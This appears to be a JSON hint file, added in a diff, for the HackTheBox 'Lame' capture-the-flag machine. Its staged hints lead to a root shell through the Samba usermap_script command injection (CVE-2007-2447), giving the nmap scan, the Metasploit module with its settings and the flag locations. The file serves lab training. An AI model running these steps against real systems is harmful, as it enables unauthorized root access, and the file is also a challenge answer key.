@@ -1,0 +1,41 @@
+{
+  "slug":       "HTB-Lame",
+  "room":       "Lame",
+  "platform":   "HackTheBox",
+  "difficulty": "Easy",
+  "author":     "Omar Tamer",
+  "tags":       ["smb", "network", "samba", "CVE-2007-2447"],
+  "description":"Samba 3.0.20 usermap_script — direct root shell via Metasploit",
+  "full_writeup_url": "",
+  "key_facts": [
+    "port 21 FTP vsftpd 2.3.4",
+    "port 22 SSH OpenSSH 4.7",
+    "port 139 Samba 3.0.20",
+    "port 445 Samba 3.0.20",
+    "CVE-2007-2447 Samba usermap_script RCE",
+    "direct root shell — no privesc needed",
+    "FTP vsftpd backdoor does not work on this box"
+  ],
+  "stages": {
+    "recon": {
+      "nudge":     "What ports came back in your nmap scan?",
+      "clue":      "You should see FTP on 21, SSH on 22, and SMB on 139 and 445. Focus on the service versions.",
+      "near_solve":"Run: nmap -sV -sC -p- 10.10.10.3 — the Samba version is the critical detail."
+    },
+    "enumeration": {
+      "nudge":     "You have Samba open — what version is it and does that version matter?",
+      "clue":      "Samba 3.0.20 has a known critical CVE. Search for it — it involves the username field in RPC.",
+      "near_solve":"The version is Samba 3.0.20 — look up CVE-2007-2447. It allows command injection via the username field in MS-RPC. Run: thoth exploit --cve CVE-2007-2447"
+    },
+    "foothold": {
+      "nudge":     "You know the CVE — what tool would you use to exploit it?",
+      "clue":      "Metasploit has a module for this exact CVE. Search for usermap in msf.",
+      "near_solve":"In Metasploit: use exploit/multi/samba/usermap_script — set RHOSTS 10.10.10.3 — set LHOST your-tun0-ip — run. You will land as root directly."
+    },
+    "flag": {
+      "nudge":     "You have a shell — what user are you and where are the flags?",
+      "clue":      "Run whoami — you should be root. Flags are in the standard locations.",
+      "near_solve":"cat /root/root.txt for root flag. For user flag: find /home -name user.txt 2>/dev/null"
+    }
+  }
+}
